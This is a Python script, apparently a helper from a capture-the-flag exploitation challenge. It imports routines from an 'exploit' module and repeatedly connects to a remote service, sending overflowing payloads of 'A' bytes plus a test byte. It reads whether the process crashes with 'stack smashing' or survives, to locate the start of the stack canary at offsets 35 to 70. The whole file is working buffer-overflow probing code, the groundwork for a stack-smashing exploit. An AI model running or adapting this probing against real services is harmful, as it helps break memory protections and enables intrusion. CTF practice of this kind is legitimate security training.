import socket
import ssl
import sys
import time
from exploit import recv_until_prompt, connect

def test_byte(offset, byte_val):
    s = connect()
    if not s: return False
    try:
        payload = b"A" * offset + byte_val
        s.sendall(str(len(payload)).encode() + b"\n")
        
        if not recv_until_prompt(s):
            s.close()
            return False
            
        s.sendall(payload)
        
        s.settimeout(2.0)
        buf = b""
        alive = False
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                buf += chunk
                
                if b"stack smashing" in buf:
                    break
                if b"Santa is missing" in buf:
                    alive = True
                    break
            except TimeoutError:
                alive = True
                break
            except Exception:
                break
        s.close()
        return alive
    except:
        s.close()
        return False

print("Searching for canary offset...")
for off in range(35, 70):
    # Test if 'A' crashes
    alive_A = test_byte(off, b"A")
    # Test if '\x00' crashes
    alive_0 = test_byte(off, b"\x00")
    
    status = ""
    if not alive_A and alive_0:
        status = " (POSSIBLE CANARY START!)"
        print(f"Offset {off}: 'A'->Crash, '\\x00'->Alive{status}")
        break  # Found it?
    elif not alive_A and not alive_0:
        status = " (Both crash - maybe overwriting return addr?)"
    elif alive_A and alive_0:
        status = " (Both pass - buffer)"
    else:
        status = " (Weird - 'A' passes, '00' crashes?)"
        
    print(f"Offset {off}: A={alive_A}, 00={alive_0}{status}")
